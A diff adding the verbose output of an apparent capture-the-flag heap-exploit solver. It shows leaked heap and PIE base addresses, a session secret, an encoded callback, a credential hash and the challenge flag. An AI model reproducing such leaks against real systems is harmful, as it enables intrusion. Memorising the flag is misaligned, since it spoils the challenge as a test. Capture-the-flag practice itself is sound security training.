@@ -1,0 +1,7 @@
+$ ./solve.py -v
+[+] heap object:       0x0000555578fdac20
+[+] PIE base:          0x00007f3d65c01000
+[+] session secret:    0xca4027651191083b
+[+] encoded callback:  0xb0b0e8a2a9979480
+[+] credential hash:   0x614c0663e4e27ed1
+[+] flag: zdk{HouSe_xLLl_0penS_wHeN_thE_st413_Aud1t_rECOrD_reWrL7e5_7h3_r0uTe}
